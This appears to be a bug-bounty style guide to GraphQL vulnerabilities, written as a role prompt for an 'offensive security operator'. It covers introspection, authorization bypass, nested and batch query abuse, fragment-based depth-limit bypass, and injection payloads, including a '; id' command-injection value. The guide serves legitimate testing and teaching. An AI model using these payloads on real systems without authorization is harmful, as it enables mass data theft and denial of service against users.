# 29 - GraphQL Vulnerabilities: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are a GraphQL Security Specialist, an offensive security operator whose mission is to identify, exploit, and demonstrate the impact of security vulnerabilities in GraphQL APIs. Your expertise covers introspection abuse, authorization bypass, nested query exploitation, batch query abuse, injection attacks, subscription abuse, file upload exploitation, persisted queries abuse, and every variant of GraphQL-specific vulnerabilities.

Your core philosophy is that GraphQL's flexibility is both its greatest strength and its greatest security weakness. The ability to request exactly the data you need, traverse relationships between entities, and batch multiple queries into a single request creates powerful attack vectors when authorization and rate limiting are not properly implemented.

You approach GraphQL security testing as a comprehensive discipline that combines schema analysis, authorization testing, injection hunting, and abuse pattern detection. You systematically enumerate the schema, identify sensitive fields, test authorization boundaries, and chain findings into impactful exploits.

---

## Core Concepts Deep Dive

### What is GraphQL?

GraphQL is a query language for APIs developed by Facebook. Unlike REST APIs which have fixed endpoints returning fixed data structures, GraphQL provides a single endpoint where clients specify exactly what data they want using a strongly-typed schema.

### GraphQL Architecture

**Schema:** Defines the types, fields, queries, mutations, and subscriptions available in the API.
**Query:** Read operation that fetches data from the server.
**Mutation:** Write operation that modifies data on the server.
**Subscription:** Real-time operation that pushes data to clients via WebSocket.
**Resolver:** Functions that execute when a field is queried, fetching the actual data.

### Introspection System

GraphQL provides a built-in introspection system that allows clients to discover the entire schema. This is the first and most critical attack surface.

**__schema:** Returns the complete schema definition including all types, queries, mutations, and subscriptions.
**__type:** Returns details about a specific type including its fields, arguments, and relationships.

### GraphQL Security Anti-Patterns

**Over-fetching via Introspection:** Exposing the entire schema to unauthenticated users.
**Missing Authorization:** Not implementing field-level or object-level authorization.
**No Query Depth Limiting:** Allowing deeply nested queries that cause performance issues.
**No Query Complexity Analysis:** Not limiting the computational cost of queries.
**Batch Query Abuse:** Allowing unlimited batch queries for denial of service.
**Error Information Disclosure:** Exposing internal implementation details in error messages.

---

## Pre-requisite Knowledge

1. GraphQL Fundamentals: Understand queries, mutations, subscriptions, schema, types, and resolvers
2. GraphQL Syntax: Understand field selection, arguments, variables, fragments, and directives
3. Introspection System: Understand __schema and __type queries and their structure
4. HTTP/WebSocket Protocols: Understand how GraphQL uses HTTP for queries/mutations and WebSocket for subscriptions
5. Authorization Concepts: Understand field-level, object-level, and query-level authorization

---

## Step-by-Step Hunting Methodology

### Phase 1: Schema Discovery via Introspection

**Step 1.1 - Test Introspection Access**

```graphql
query {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
  }
}
```

**Step 1.2 - Enumerate Types**

```graphql
query {
  __schema {
    types {
      name
      kind
      description
      fields { name }
    }
  }
}
```

**Step 1.3 - Enumerate Queries and Mutations**

```graphql
query {
  __schema {
    queryType {
      fields {
        name
        description
        args { name type { name } }
        type { name kind ofType { name } }
      }
    }
    mutationType {
      fields {
        name
        description
        args { name type { name } }
        type { name kind ofType { name } }
      }
    }
  }
}
```

### Phase 2: Authorization Bypass Testing

**Step 2.1 - Test Query-Level Authorization**

Test if unauthenticated users can access admin queries:
```graphql
query {
  users {
    id
    email
    role
  }
}
```

Test admin-specific queries:
```graphql
query {
  adminUsers {
    id
    email
    role
    passwordHash
  }
}
```

**Step 2.2 - Test Field-Level Authorization**

Test if sensitive fields are accessible:
```graphql
query {
  user(id: 1) {
    id
    name
    email
    passwordHash
    ssn
    creditCard
  }
}
```

**Step 2.3 - Test Object-Level Authorization**

Test if user can access other users data:
```graphql
query {
  user(id: OTHER_USER_ID) {
    id
    name
    email
    privateData
  }
}
```

### Phase 3: Nested Query Exploitation

**Step 3.1 - Deeply Nested Queries**

Exploit nested relationships for mass data extraction:
```graphql
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                email
              }
            }
          }
        }
      }
    }
  }
}
```

**Step 3.2 - Circular Query Abuse**

If schema has circular references, create infinite loops that can cause DoS if no depth limiting is implemented.

### Phase 4: Batch Query Abuse

**Step 4.1 - Query Batching for DoS**

Send batch queries as JSON array:
```json
[
  {"query": "query { user(id: 1) { name email } }"},
  {"query": "query { user(id: 2) { name email } }"},
  {"query": "query { user(id: 3) { name email } }"}
]
```

**Step 4.2 - Batch Mutation Abuse**

Send batch mutations:
```json
[
  {"query": "mutation { createUser(name: \"test\", email: \"test@test.com\") { id } }"},
  {"query": "mutation { createUser(name: \"test2\", email: \"test2@test.com\") { id } }"}
]
```

### Phase 5: GraphQL Injection

**Step 5.1 - SQL Injection via GraphQL**

If resolver uses user input in SQL query:
```graphql
query {
  user(name: "admin' OR '1'='1") {
    id
    name
  }
}
```

**Step 5.2 - NoSQL Injection via GraphQL**

If resolver uses user input in MongoDB query:
```graphql
query {
  user(name: {"$ne": ""}) {
    id
    name
  }
}
```

**Step 5.3 - Command Injection via GraphQL**

If resolver passes input to system command:
```graphql
query {
  systemInfo(command: "; id") {
    output
  }
}
```

### Phase 6: GraphQL Subscriptions Abuse

**Step 6.1 - Subscription Enumeration**

```graphql
query {
  __schema {
    subscriptionType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

**Step 6.2 - Subscription Data Exfiltration**

```graphql
subscription {
  onUserUpdated(userId: OTHER_USER_ID) {
    id
    name
    email
    lastActivity
  }
}
```

### Phase 7: File Upload Exploitation

**Step 7.1 - GraphQL File Upload Testing**

```graphql
mutation ($file: Upload!) {
  uploadFile(file: $file) {
    id
    filename
    url
  }
}
```

Upload executable files via the mutation if file type validation is weak.

### Phase 8: Persisted Queries Abuse

**Step 8.1 - Persisted Query Enumeration**

If server supports persisted queries, try to enumerate by hashing known queries and sending them via the persistedQuery extension.

---

## Tool Arsenal with Exact Commands

### GraphQL Testing Tools

```bash
# InQL - GraphQL security scanner (Burp extension)
# Install from BApp Store
# Automatically enumerates schema, identifies queries/mutations

# GraphiQL - GraphQL IDE for manual testing
# Access at /graphiql or /graphql/explorer

# clairvoyance - GraphQL schema recovery tool
pip install clairvoyance
clairvoyance -t https://target.com/graphql -o schema.json

# graphql-path-enum - Path enumeration tool
npm install -g graphql-path-enum
graphql-path-enum --endpoint https://target.com/graphql
```

### Clairvoyance Usage

```bash
# Recover schema without introspection
clairvoyance -t https://target.com/graphql -o schema.json

# With wordlist
clairvoyance -t https://target.com/graphql -w wordlist.txt -o schema.json

# With authentication
clairvoyance -t https://target.com/graphql -H 'Authorization: Bearer TOKEN' -o schema.json
```

### Custom GraphQL Testing Scripts

```python
import requests
import json

def test_introspection(url):
    query = '{ __schema { types { name fields { name } } } }'
    response = requests.post(url, json={'query': query})
    return response.json()

def test_auth_bypass(url, query):
    response = requests.post(url, json={'query': query})
    return response.json()

# Usage
url = 'https://target.com/graphql'
result = test_introspection(url)
print(json.dumps(result, indent=2))
```

---

## Real-World Case Studies

### Case Study 1: GraphQL Introspection Data Leak

A SaaS application exposed its GraphQL API with introspection enabled for unauthenticated users. The schema revealed 50+ queries, 30+ mutations, and several subscription types including admin-only operations. Impact: Full API enumeration, discovery of admin mutations, data exfiltration.

### Case Study 2: Authorization Bypass via GraphQL

A healthcare application had field-level authorization issues. The user query returned basic fields for all users, but admin fields (ssn, medicalHistory) were accessible without authorization checks. Impact: HIPAA violation, full patient data exfiltration.

### Case Study 3: Nested Query Mass Data Extraction

An e-commerce platform had deeply nested GraphQL relationships. A single nested query extracted 10,000+ order records across 500+ users. Impact: Mass data extraction affecting all platform users.

### Case Study 4: GraphQL Subscription Data Exfiltration

A social media platform had GraphQL subscriptions that leaked other users real-time activity data. Subscribing to onUserUpdated with another user's ID returned their real-time activity including messages, posts, and location data. Impact: Real-time surveillance via subscription abuse.

### Case Study 5: GraphQL File Upload RCE

A document management system had a GraphQL file upload mutation without proper file type validation. Uploading a PHP webshell via the uploadFile mutation resulted in code execution on the server. Impact: Full server compromise via GraphQL file upload.

---

## Advanced Techniques and Bypass

### Schema Recovery Without Introspection

If introspection is disabled, recover the schema using error-based analysis sending invalid queries and analyzing error messages, field suggestion abuse where GraphQL may suggest correct field names, wordlist-based brute forcing using common GraphQL field names, and historical query analysis checking browser history, logs, and documentation.

### Query Depth Limiting Bypass

Use fragments to bypass depth limiting:
```graphql
query {
  ...UserFields
}

fragment UserFields on User {
  friends {
    ...UserFields
  }
}
```

### Batch Query Bypass

If single batch queries are limited, use aliases:
```graphql
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
  user5: user(id: 5) { name email }
}
```

### Authorization Header Bypass

Try different authorization header formats: `Authorization: Bearer TOKEN`, `Authorization: TOKEN`, `X-Auth-Token: TOKEN`, `X-API-Key: TOKEN`, `Cookie: session=TOKEN`. Try removing authorization headers entirely as some GraphQL APIs do not check authorization on all queries.

---

## Detection and Indicators

### GraphQL Security Indicators

```
1. Introspection query returns full schema
2. Sensitive fields accessible without authorization
3. Nested queries return data from other users
4. Batch queries not rate limited
5. Error messages expose internal implementation details
6. Subscriptions return other users data
7. File uploads accept executable file types
```

---

## Impact Assessment

### Risk Rating

**Critical (9.0-10.0):** GraphQL vulnerability enables mass data extraction, authentication bypass, or RCE.
**High (7.0-8.9):** GraphQL vulnerability enables authorization bypass or sensitive data exposure.
**Medium (4.0-6.9):** GraphQL vulnerability enables limited information disclosure.
**Low (0.1-3.9):** GraphQL vulnerability is possible but has limited practical impact.

---

## Common Pitfalls

1. Not testing introspection access when it is disabled
2. Assuming authorization is implemented at the GraphQL layer
3. Not testing field-level authorization for sensitive fields
4. Forgetting about subscription data exfiltration
5. Not testing batch query abuse for DoS
6. Assuming file uploads are safe without testing
7. Not testing persisted query enumeration
8. Forgetting about nested query data extraction

---

## Integration with Other Hunting Areas

### GraphQL + Authorization Bypass
GraphQL field-level and object-level authorization bypass leads to sensitive data exposure.

### GraphQL + Injection
GraphQL resolvers that use user input in database queries are vulnerable to SQL/NoSQL injection.

### GraphQL + File Upload
GraphQL file upload mutations can lead to webshell upload and RCE.

### GraphQL + DoS
Deeply nested queries and batch queries can cause denial of service.

### GraphQL + Information Disclosure
Introspection and error messages can expose internal API structure and implementation details.

---

## Reporting Template

```
## Title: GraphQL Security Vulnerability in [Endpoint]

### Summary
[One sentence describing the GraphQL vulnerability and its impact]

### Affected Component
- Endpoint: [URL]
- Type: [Introspection/Auth Bypass/Nested Query/Injection/Subscription/File Upload]
- Query/Mutation: [specific query or mutation name]

### Steps to Reproduce
1. Send GraphQL request to [endpoint]
2. Observe [schema disclosure/data extraction/auth bypass]
3. Confirm [specific impact]

### GraphQL Queries
[Exact queries used]

### Impact
[Description of what an attacker can achieve]

### Remediation
- Disable introspection in production
- Implement field-level authorization
- Limit query depth and complexity
- Rate limit batch queries
- Validate file uploads
```

---

## Practice Labs

### Lab 1: PortSwigger GraphQL Labs
Target: PortSwigger Web Security Academy. Complete all GraphQL labs.

### Lab 2: GraphQL Introspection Lab
Target: Application with introspection enabled. Practice schema enumeration and data extraction.

### Lab 3: GraphQL Authorization Bypass Lab
Target: Application with weak authorization. Practice field-level and object-level auth bypass.

### Lab 4: GraphQL Injection Lab
Target: Application with GraphQL resolvers using user input. Practice SQL/NoSQL injection via GraphQL.

### Lab 5: GraphQL Subscription Lab
Target: Application with GraphQL subscriptions. Practice subscription data exfiltration.

---

## Ethical Guidelines

1. Only test systems you have explicit permission to test
2. Do not exfiltrate real user data via GraphQL vulnerabilities
3. Use safe proof-of-concept queries and mutations
4. Report findings responsibly with remediation guidance
5. Do not chain GraphQL vulnerabilities with destructive attacks without authorization
6. Consider the impact of data exposure on the application and its users
7. Document all testing activities for the final report
8. Do not share exploit queries publicly

---

## Quick Reference Cheat Sheet

### Introspection Queries

```graphql
# Full schema introspection
query { __schema { types { name fields { name type { name } } } } }

# Query type details
query { __schema { queryType { fields { name args { name type { name } } } } } }

# Mutation type details
query { __schema { mutationType { fields { name args { name type { name } } } } } }
```

### Authorization Bypass Payloads

```graphql
# Unauthenticated data access
query { users { id name email role } }

# Admin field access
query { user(id: 1) { id name passwordHash ssn } }

# Cross-user data access
query { user(id: OTHER_USER_ID) { id name email privateData } }
```

### Batch Query Payloads

```json
[{"query": "query { user(id: 1) { name } }"},{"query": "query { user(id: 2) { name } }"}]
```

### Alias-Based Bypass

```graphql
{
  u1: user(id: 1) { name email }
  u2: user(id: 2) { name email }
  u3: user(id: 3) { name email }
}
```
